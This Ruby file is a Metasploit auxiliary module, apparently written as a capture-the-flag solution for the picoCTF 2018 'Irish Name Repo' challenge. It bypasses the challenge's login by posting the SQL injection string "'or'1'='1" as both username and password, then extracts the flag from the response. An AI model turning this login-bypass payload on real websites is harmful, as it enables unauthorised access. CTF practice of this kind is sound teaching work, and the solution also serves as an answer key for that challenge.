#!/usr/bin/env ruby

require 'msf/core'  # Metasploit module

class MetasploitModule < Msf::Auxiliary

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'Web Explotation: Irish Name Repo - Points: 200',
      'Description' => %q(
                        There is a website running at http://2018shell2.picoctf.com:52012. Do you think you can log us in? Try to see if you can login!

                        [HINTS]:
                          There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?
                        ),
      'Author'      => ['CosasDePuma <https://github.com/cosasdepuma>'],
      'Privileged'  => 'false',
      'License'     => MSF_LICENSE
    )

    deregister_options('Proxies', 'VHOST', 'SSL')

    deregister_options(                           # Advanced Options
      'DOMAIN', 'DigestAuthIIS', 'FingerprintCheck', 'HttpClientTimeout',
      'HttpPassword', 'HttpTrace', 'HttpUsername', 'SSLVersion', 'WORKSPACE'
    )

    register_options(
      [
        Opt::RHOST('2018shell2.picoctf.com'),
        Opt::RPORT('52012'),

        OptString.new('TARGETURI', [true, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/login.php'])
      ], self.class
    )
  end

  def run
    begin
      # Send a POST request to the server
      print_status("Sending POST request to TCP/#{rport} #{target_uri}...")
      # Some magic quotes...
      res = send_request_cgi({
        'uri'     => target_uri.path,
        'method'  => 'POST',
        'vars_post' => {
          'debug'     =>  '0',
          'username'  =>  "'or'1'='1",
          'password'  =>  "'or'1'='1"
        }
      })
      # Get the body of the request
      html_source = res.get_html_document.to_s
      # Regex the flag
      flag = html_source.scan(/picoCTF{.*}/)[0]
      print_good("Solved: #{flag}")
    rescue
      # Handle errors
      print_error('Unhandled exception during execution')
    end
  end

end
